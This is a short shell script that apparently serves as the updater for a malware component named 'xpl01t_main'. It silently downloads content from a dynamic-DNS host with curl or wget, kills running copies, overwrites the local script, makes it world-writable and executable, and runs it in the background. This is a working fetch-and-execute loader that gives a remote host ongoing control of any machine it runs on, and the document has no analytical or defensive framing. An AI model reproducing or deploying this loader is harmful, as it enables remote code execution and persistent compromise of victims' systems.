#!/bin/sh

UPDATE_LINK="http://xpl01tmainsh.ddns.net"
DEBUG=1
DATA=""
LAST_UPDATE=$(cat xpl01t_main.sh)

if [ -f "/bin/curl" ]; then
	#curl found
	if [ $DEBUG ]; then
		echo "Using curl";
	fi
	DATA=$(/bin/curl --silent $UPDATE_LINK)
elif [ -f "/bin/wget" ]; then
	#wget found
	if [ $DEBUG ]; then
		echo "Using wget";
	fi
	DATA=$(/bin/wget -q -O - $UPDATE_LINK)
else
	#error
	echo "Can't update because curl and wget don't exist";
fi

if [ ${#DATA} -eq 0 ]; then
	echo "Empty data"
	exit 0
fi

if [ "$LAST_UPDATE" = "$DATA" ]; then
	echo "Already updated"
	exit 0
fi

pkill -f xpl01t_main
pkill -f xpl01t_main.sh

echo $DATA>"xpl01t_main.sh"
chmod 777 xpl01t_main.sh
./xpl01t_main.sh &
